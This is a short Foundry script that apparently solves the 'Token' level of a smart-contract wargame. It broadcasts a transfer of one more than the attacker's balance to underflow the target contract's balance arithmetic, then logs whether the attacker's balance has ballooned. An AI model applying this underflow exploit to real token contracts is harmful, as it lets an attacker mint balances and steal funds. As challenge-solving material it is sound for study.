// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import {Script} from "lib-src/Script.sol";
import {console} from "lib-src/console.sol";

import {IToken} from "src/interfaces/IToken.sol";

// forge script script/5_Token.s.sol --tc TokenSolution -vvv
contract TokenSolution is Script {

    IToken public target = IToken(0x491459EE4E389ed1122402A9B540c4bd2Bb91b5b);
    address public attacker = 0x5F49CfE21B12ffD7fE0dDd11E91b2636F86D7358;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

       target.transfer(address(this), target.balanceOf(attacker) + 1);
       console.log("Attack success:", target.balanceOf(attacker) > type(uint248).max);

        vm.stopBroadcast();
    }
}
